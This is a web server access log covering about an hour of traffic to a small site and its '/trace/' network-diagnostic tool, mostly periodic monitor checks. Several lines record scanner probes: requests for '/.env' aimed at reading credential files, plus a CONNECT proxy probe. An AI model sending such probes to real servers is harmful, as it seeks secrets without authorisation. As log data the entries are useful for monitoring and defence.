167.71.120.76 - - [15/Dec/2023:23:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2575 "www@docker" "http://172.28.0.10:80" 1ms
54.37.79.75 - - [15/Dec/2023:23:48:41 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2576 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:23:48:42 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2577 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:23:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2578 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2579 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2580 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2581 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:23:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2582 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2583 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2584 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2585 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2586 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2587 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2588 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2589 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2590 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2591 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2592 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:23:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2593 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:23:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2594 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:23:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2595 "www@docker" "http://172.28.0.10:80" 0ms
12.248.214.166 - - [15/Dec/2023:23:57:51 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 2596 "livetrace@docker" "http://172.28.0.5:80" 112ms
12.248.214.166 - - [15/Dec/2023:23:57:51 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 2597 "livetrace@docker" "http://172.28.0.5:80" 0ms
54.36.115.221 - - [15/Dec/2023:23:58:02 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2598 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [15/Dec/2023:23:58:02 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2599 "web-to-websecure@internal" "-" 0ms
198.235.24.255 - - [15/Dec/2023:23:58:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2600 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:23:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2601 "www@docker" "http://172.28.0.10:80" 16ms
167.71.120.76 - - [15/Dec/2023:23:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2602 "www@docker" "http://172.28.0.10:80" 22ms
167.71.120.76 - - [15/Dec/2023:23:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1 "www@docker" "http://172.29.0.8:80" 31ms
159.203.109.206 - - [16/Dec/2023:00:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2 "www@docker" "http://172.29.0.8:80" 19ms
167.71.120.76 - - [16/Dec/2023:00:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3 "www@docker" "http://172.29.0.8:80" 13ms
143.110.222.166 - - [16/Dec/2023:00:01:10 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:00:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6 "www@docker" "http://172.29.0.8:80" 0ms
12.248.214.166 - - [16/Dec/2023:00:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7 "www@docker" "http://172.29.0.8:80" 29ms
12.248.214.166 - - [16/Dec/2023:00:02:20 +0000] "GET /styles.css HTTP/2.0" 200 326 "-" "-" 8 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10 "www@docker" "http://172.29.0.8:80" 1ms
35.203.211.214 - - [16/Dec/2023:00:02:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:00:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 12 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 13 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 14 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 15 "www@docker" "http://172.29.0.8:80" 34ms
159.203.109.206 - - [16/Dec/2023:00:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 17 "www@docker" "http://172.29.0.8:80" 17ms
12.248.214.166 - - [16/Dec/2023:00:05:21 +0000] "GET /trace/ HTTP/2.0" 200 3650 "-" "-" 16 "livetrace@docker" "http://172.29.0.3:80" 5031ms
12.248.214.166 - - [16/Dec/2023:00:05:26 +0000] "GET /favicon.ico HTTP/2.0" 499 21 "-" "-" 18 "www@docker" "http://172.29.0.8:80" 15ms
12.248.214.166 - - [16/Dec/2023:00:05:30 +0000] "GET /trace/startping.php?id=spjz5vgeg HTTP/2.0" 200 105 "-" "-" 19 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.248.214.166 - - [16/Dec/2023:00:05:31 +0000] "GET /trace/pollping.php?id=spjz5vgeg HTTP/2.0" 200 90 "-" "-" 20 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:00:05:32 +0000] "GET /trace/starttrace.php?id=p92hpt2xa HTTP/2.0" 200 106 "-" "-" 21 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.248.214.166 - - [16/Dec/2023:00:05:32 +0000] "GET /trace/pollping.php?id=spjz5vgeg HTTP/2.0" 200 90 "-" "-" 22 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:00:05:33 +0000] "GET /trace/polltrace.php?id=p92hpt2xa HTTP/2.0" 200 35 "-" "-" 23 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:00:05:33 +0000] "GET /trace/cleantrace.php?id=p92hpt2xa HTTP/2.0" 200 72 "-" "-" 24 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.248.214.166 - - [16/Dec/2023:00:05:33 +0000] "GET /trace/pollping.php?id=spjz5vgeg HTTP/2.0" 200 91 "-" "-" 25 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:00:05:34 +0000] "GET /trace/pollping.php?id=spjz5vgeg HTTP/2.0" 200 91 "-" "-" 26 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:00:05:35 +0000] "GET /trace/pollping.php?id=spjz5vgeg HTTP/2.0" 200 91 "-" "-" 27 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:00:05:36 +0000] "GET /trace/pollping.php?id=spjz5vgeg HTTP/2.0" 200 91 "-" "-" 28 "livetrace@docker" "http://172.29.0.3:80" 2ms
167.71.120.76 - - [16/Dec/2023:00:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 29 "www@docker" "http://172.29.0.8:80" 1ms
12.248.214.166 - - [16/Dec/2023:00:05:37 +0000] "GET /trace/pollping.php?id=spjz5vgeg HTTP/2.0" 200 91 "-" "-" 30 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:00:05:38 +0000] "GET /trace/pollping.php?id=spjz5vgeg HTTP/2.0" 200 101 "-" "-" 31 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.248.214.166 - - [16/Dec/2023:00:05:38 +0000] "GET /trace/cleanping.php?id=spjz5vgeg HTTP/2.0" 200 71 "-" "-" 32 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.248.214.166 - - [16/Dec/2023:00:06:00 +0000] "GET /trace/starttrace.php?id=yl0g7b9vl HTTP/2.0" 200 106 "-" "-" 33 "livetrace@docker" "http://172.29.0.3:80" 4ms
12.248.214.166 - - [16/Dec/2023:00:06:01 +0000] "GET /trace/polltrace.php?id=yl0g7b9vl HTTP/2.0" 200 35 "-" "-" 34 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:00:06:01 +0000] "GET /trace/cleantrace.php?id=yl0g7b9vl HTTP/2.0" 200 72 "-" "-" 35 "livetrace@docker" "http://172.29.0.3:80" 3ms
61.7.138.40 - - [16/Dec/2023:00:06:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 36 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:00:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 37 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 38 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 39 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 40 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 41 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 42 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:00:09:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 43 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:00:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 44 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 45 "www@docker" "http://172.29.0.8:80" 1ms
12.248.214.166 - - [16/Dec/2023:00:09:42 +0000] "GET /trace/ HTTP/2.0" 200 3650 "-" "-" 46 "livetrace@docker" "http://172.29.0.3:80" 8ms
12.248.214.166 - - [16/Dec/2023:00:09:44 +0000] "GET /trace/starttrace.php?id=5i4bwyjsk HTTP/2.0" 200 106 "-" "-" 47 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.248.214.166 - - [16/Dec/2023:00:09:45 +0000] "GET /trace/polltrace.php?id=5i4bwyjsk HTTP/2.0" 200 35 "-" "-" 48 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:00:09:45 +0000] "GET /trace/cleantrace.php?id=5i4bwyjsk HTTP/2.0" 200 72 "-" "-" 49 "livetrace@docker" "http://172.29.0.3:80" 2ms
159.203.109.206 - - [16/Dec/2023:00:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 50 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 51 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 52 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 53 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 54 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 55 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 56 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 57 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 58 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 59 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 60 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 61 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 62 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 63 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 64 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 65 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 66 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 67 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 68 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 69 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 70 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 71 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 72 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 73 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 74 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 75 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 76 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 77 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 78 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 79 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 80 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 81 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 82 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 83 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 84 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 85 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 86 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 87 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 88 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 89 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 90 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 91 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 92 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 93 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 94 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 95 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 96 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 97 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 98 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 99 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 100 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 101 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 102 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 103 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 104 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 105 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 106 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 107 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 108 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 109 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 110 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 111 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 112 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 113 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 114 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 115 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 116 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 117 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 118 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 119 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 120 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 121 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 122 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 123 "www@docker" "http://172.29.0.8:80" 27ms
12.248.214.166 - - [16/Dec/2023:00:46:46 +0000] "GET /trace/ HTTP/2.0" 200 3652 "-" "-" 124 "livetrace@docker" "http://172.29.0.3:80" 5019ms
12.248.214.166 - - [16/Dec/2023:00:46:56 +0000] "GET /trace/starttrace.php?id=q5atjdcj5 HTTP/2.0" 200 106 "-" "-" 125 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.248.214.166 - - [16/Dec/2023:00:46:57 +0000] "GET /trace/polltrace.php?id=q5atjdcj5 HTTP/2.0" 200 980 "-" "-" 126 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:00:46:58 +0000] "GET /trace/polltrace.php?id=q5atjdcj5 HTTP/2.0" 200 1423 "-" "-" 127 "livetrace@docker" "http://172.29.0.3:80" 2ms
12.248.214.166 - - [16/Dec/2023:00:46:59 +0000] "GET /trace/polltrace.php?id=q5atjdcj5 HTTP/2.0" 200 1443 "-" "-" 128 "livetrace@docker" "http://172.29.0.3:80" 2ms
159.203.109.206 - - [16/Dec/2023:00:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 129 "www@docker" "http://172.29.0.8:80" 23ms
167.71.120.76 - - [16/Dec/2023:00:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 130 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 131 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 132 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 133 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:00:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 134 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 135 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 136 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 137 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 138 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 139 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 140 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:00:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 141 "www@docker" "http://172.29.0.8:80" 0ms
12.248.214.166 - - [16/Dec/2023:00:53:30 +0000] "GET /trace/ HTTP/2.0" 200 3652 "-" "-" 142 "livetrace@docker" "http://172.29.0.3:80" 5007ms
167.71.120.76 - - [16/Dec/2023:00:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 143 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:00:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 144 "www@docker" "http://172.29.0.8:80" 27ms
167.71.120.76 - - [16/Dec/2023:00:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 145 "www@docker" "http://172.29.0.8:80" 31ms
159.203.109.206 - - [16/Dec/2023:00:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 146 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:00:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 147 "www@docker" "http://172.29.0.8:80" 0ms
90.151.171.106 - - [16/Dec/2023:00:55:44 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 148 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [16/Dec/2023:00:55:54 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 149 "web-to-websecure@internal" "-" 0ms
